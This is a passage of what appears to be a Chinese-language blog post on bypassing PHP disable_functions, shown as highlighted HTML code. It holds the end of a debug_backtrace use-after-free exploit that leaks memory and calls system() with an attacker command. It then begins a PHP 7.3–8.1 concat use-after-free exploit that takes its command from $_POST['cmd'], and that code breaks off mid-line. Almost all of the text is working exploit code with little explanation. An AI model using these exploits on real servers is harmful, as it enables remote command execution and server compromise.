class="hljs-keyword">isset</span>(<span class="hljs-variable">$backtrace</span>[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>])) &#123; <span class="hljs-comment"># PHP &gt;= 7.4</span><br>                <span class="hljs-variable">$backtrace</span> = <span class="hljs-title function_ invoke__">debug_backtrace</span>();<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span>, <span class="hljs-variable">$d</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str2ptr</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$address</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-variable">$s</span>-<span class="hljs-number">1</span>; <span class="hljs-variable">$j</span> &gt;= <span class="hljs-number">0</span>; <span class="hljs-variable">$j</span>--) &#123;<br>            <span class="hljs-variable">$address</span> &lt;&lt;= <span class="hljs-number">8</span>;<br>            <span class="hljs-variable">$address</span> |= <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span>+<span class="hljs-variable">$j</span>]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$address</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ptr2str</span>(<span class="hljs-params"><span class="hljs-variable">$ptr</span>, <span class="hljs-variable">$m</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$m</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$out</span> .= <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$ptr</span> &amp; <span class="hljs-number">0xff</span>);<br>            <span class="hljs-variable">$ptr</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$out</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span>, <span class="hljs-variable">$v</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span> + <span class="hljs-variable">$i</span>] = <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$v</span> &amp; <span class="hljs-number">0xff</span>);<br>            <span class="hljs-variable">$v</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leak</span>(<span class="hljs-params"><span class="hljs-variable">$addr</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>;<br>        <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x68</span>, <span class="hljs-variable">$addr</span> + <span class="hljs-variable">$p</span> - <span class="hljs-number">0x10</span>);<br>        <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$helper</span>-&gt;a);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$s</span> != <span class="hljs-number">8</span>) &#123; <span class="hljs-variable">$leak</span> %= <span class="hljs-number">2</span> &lt;&lt; (<span class="hljs-variable">$s</span> * <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>; &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$leak</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parse_elf</span>(<span class="hljs-params"><span class="hljs-variable">$base</span></span>) </span>&#123;<br>        <span class="hljs-variable">$e_type</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-variable">$e_phoff</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x20</span>);<br>        <span class="hljs-variable">$e_phentsize</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">2</span>);<br>        <span class="hljs-variable">$e_phnum</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$e_phnum</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$header</span> = <span class="hljs-variable">$base</span> + <span class="hljs-variable">$e_phoff</span> + <span class="hljs-variable">$i</span> * <span class="hljs-variable">$e_phentsize</span>;<br>            <span class="hljs-variable">$p_type</span>  = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_flags</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_vaddr</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x10</span>);<br>            <span class="hljs-variable">$p_memsz</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x28</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">6</span>) &#123; <span class="hljs-comment"># PT_LOAD, PF_Read_Write</span><br>                <span class="hljs-comment"># handle pie</span><br>                <span class="hljs-variable">$data_addr</span> = <span class="hljs-variable">$e_type</span> == <span class="hljs-number">2</span> ? <span class="hljs-variable">$p_vaddr</span> : <span class="hljs-variable">$base</span> + <span class="hljs-variable">$p_vaddr</span>;<br>                <span class="hljs-variable">$data_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">5</span>) &#123; <span class="hljs-comment"># PT_LOAD, PF_Read_exec</span><br>                <span class="hljs-variable">$text_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$data_addr</span> || !<span class="hljs-variable">$text_size</span> || !<span class="hljs-variable">$data_size</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">return</span> [<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>];<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_basic_funcs</span>(<span class="hljs-params"><span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span></span>) </span>&#123;<br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>) = <span class="hljs-variable">$elf</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$data_size</span> / <span class="hljs-number">8</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$leak</span>);<br>                <span class="hljs-comment"># &#x27;constant&#x27; constant check</span><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x746e6174736e6f63</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$data_addr</span>, (<span class="hljs-variable">$i</span> + <span class="hljs-number">4</span>) * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$leak</span>);<br>                <span class="hljs-comment"># &#x27;bin2hex&#x27; constant check</span><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x786568326e6962</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$data_addr</span> + <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_binary_base</span>(<span class="hljs-params"><span class="hljs-variable">$binary_leak</span></span>) </span>&#123;<br>        <span class="hljs-variable">$base</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$start</span> = <span class="hljs-variable">$binary_leak</span> &amp; <span class="hljs-number">0xfffffffffffff000</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x1000</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$start</span> - <span class="hljs-number">0x1000</span> * <span class="hljs-variable">$i</span>;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> == <span class="hljs-number">0x10102464c457f</span>) &#123; <span class="hljs-comment"># ELF header</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$addr</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_system</span>(<span class="hljs-params"><span class="hljs-variable">$basic_funcs</span></span>) </span>&#123;<br>        <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$basic_funcs</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-variable">$f_entry</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span>);<br>            <span class="hljs-variable">$f_name</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$f_entry</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$f_name</span> == <span class="hljs-number">0x6d6574737973</span>) &#123; <span class="hljs-comment"># system</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span> + <span class="hljs-number">8</span>);<br>            &#125;<br>            <span class="hljs-variable">$addr</span> += <span class="hljs-number">0x20</span>;<br>        &#125; <span class="hljs-keyword">while</span>(<span class="hljs-variable">$f_entry</span> != <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">trigger_uaf</span>(<span class="hljs-params"><span class="hljs-variable">$arg</span></span>) </span>&#123;<br>        <span class="hljs-comment"># str_shuffle prevents opcache string interning</span><br>        <span class="hljs-variable">$arg</span> = <span class="hljs-title function_ invoke__">str_shuffle</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">79</span>));<br>        <span class="hljs-variable">$vuln</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vuln</span>();<br>        <span class="hljs-variable">$vuln</span>-&gt;a = <span class="hljs-variable">$arg</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(PHP_OS, <span class="hljs-string">&#x27;WIN&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;This PoC is for *nix systems only.&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$n_alloc</span> = <span class="hljs-number">10</span>; <span class="hljs-comment"># increase this value if UAF fails</span><br>    <span class="hljs-variable">$contiguous</span> = [];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n_alloc</span>; <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-variable">$contiguous</span>[] = <span class="hljs-title function_ invoke__">str_shuffle</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">79</span>));<br><br>    <span class="hljs-title function_ invoke__">trigger_uaf</span>(<span class="hljs-string">&#x27;x&#x27;</span>);<br>    <span class="hljs-variable">$abc</span> = <span class="hljs-variable">$backtrace</span>[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>][<span class="hljs-number">0</span>];<br><br>    <span class="hljs-variable">$helper</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Helper</span>;<br>    <span class="hljs-variable">$helper</span>-&gt;b = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$x</span></span>) </span>&#123; &#125;;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">79</span> || <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;UAF failed&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment"># leaks</span><br>    <span class="hljs-variable">$closure_handlers</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-variable">$php_heap</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x58</span>);<br>    <span class="hljs-variable">$abc_addr</span> = <span class="hljs-variable">$php_heap</span> - <span class="hljs-number">0xc8</span>;<br><br>    <span class="hljs-comment"># fake value</span><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">6</span>);<br><br>    <span class="hljs-comment"># fake reference</span><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x10</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-number">0x60</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xa</span>);<br><br>    <span class="hljs-variable">$closure_obj</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-variable">$binary_leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_handlers</span>, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$base</span> = <span class="hljs-title function_ invoke__">get_binary_base</span>(<span class="hljs-variable">$binary_leak</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$elf</span> = <span class="hljs-title function_ invoke__">parse_elf</span>(<span class="hljs-variable">$base</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$basic_funcs</span> = <span class="hljs-title function_ invoke__">get_basic_funcs</span>(<span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$zif_system</span> = <span class="hljs-title function_ invoke__">get_system</span>(<span class="hljs-variable">$basic_funcs</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment"># fake closure object</span><br>    <span class="hljs-variable">$fake_obj_offset</span> = <span class="hljs-number">0xd0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x110</span>; <span class="hljs-variable">$i</span> += <span class="hljs-number">8</span>) &#123;<br>        <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-variable">$fake_obj_offset</span> + <span class="hljs-variable">$i</span>, <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_obj</span>, <span class="hljs-variable">$i</span>));<br>    &#125;<br><br>    <span class="hljs-comment"># pwn</span><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-variable">$fake_obj_offset</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x38</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>); <span class="hljs-comment"># internal func type</span><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x68</span>, <span class="hljs-variable">$zif_system</span>); <span class="hljs-comment"># internal func handler</span><br><br>    (<span class="hljs-variable">$helper</span>-&gt;b)(<span class="hljs-variable">$cmd</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="php-Concat-UAF（PHP-7-3-8-1）"><a href="#php-Concat-UAF（PHP-7-3-8-1）" class="headerlink" title="php_Concat_UAF（PHP 7.3-8.1）"></a>php_Concat_UAF（PHP 7.3-8.1）</h2><p><strong>利用条件</strong></p><ul><li>Linux 操作系统</li><li>PHP7.3 - all versions to date</li><li>PHP7.4 - all versions to date</li><li>PHP8.0 - all versions to date</li><li>PHP8.1 - all versions to date</li></ul><p><strong>原理</strong></p><p>此漏洞利用了处理字符串连接的函数中的错误。如果满足某些条件，诸如 $a.$b 之类的语句可能会导致内存损坏。错误报告提供了对该漏洞的非常详尽的分析</p><p><a href="https://bugs.php.net/bug.php?id=81705">type confusion&#x2F;UAF on set_error_handler with concat operation</a></p><p><strong>exp</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment"># PHP 7.3-8.1 disable_functions bypass PoC (*nix only)</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Bug: https://bugs.php.net/bug.php?id=81705</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># This exploit should work on all PHP 7.3-8.1 versions</span><br><span class="hljs-comment"># released as of 2022-01-07</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Author: https://github.com/mm0r1</span><br><br><span class="hljs-comment">//new Pwn(&quot;uname -a&quot;);</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Pwn</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123; <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span>; &#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pwn</span> </span>&#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">LOGGING</span> = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CHUNK_DATA_SIZE</span> = <span class="hljs-number">0x60</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CHUNK_SIZE</span> = ZEND_DEBUG_BUILD ? <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">CHUNK_DATA_SIZE</span> + <span class="hljs-number">0x20</span> : <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">CHUNK_DATA_SIZE</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">STRING_SIZE</span> = <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">CHUNK_DATA_SIZE</span> - <span class="hljs-number">0x18</span> - <span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">HT_SIZE</span> = <span class="hljs-number">0x118</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">HT_STRING_SIZE</span> = <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">HT_SIZE</span> - <span class="hljs-number">0x18</span> - <span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">10</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$groom</span>[] = <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">alloc</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">STRING_SIZE</span>);<br>            <span class="hljs-variable">$groom</span>[] = <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">alloc</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">HT_STRING_SIZE</span>);<br>        &#125;<br>        <br>        <span class="hljs-variable">$concat_str_addr</span> = <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">heap_leak</span>(), <span class="hljs-number">16</span>);<br>        <span class="hljs-variable">$fill</span> = <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">alloc</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">STRING_SIZE</span>);<br><br>        <span class="hljs-variable language_">$this</span>-&gt;abc = <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">alloc</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">STRING_SIZE</span>);<br>        <span class="hljs-variable">$abc_addr</span> = <span class="hljs-variable">$concat_str_addr</span> + <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">CHUNK_SIZE</span>;<br>        <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;abc @ 0x%x&quot;</span>, <span class="hljs-variable">$abc_addr</span>);<br><br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">free</span>(<span 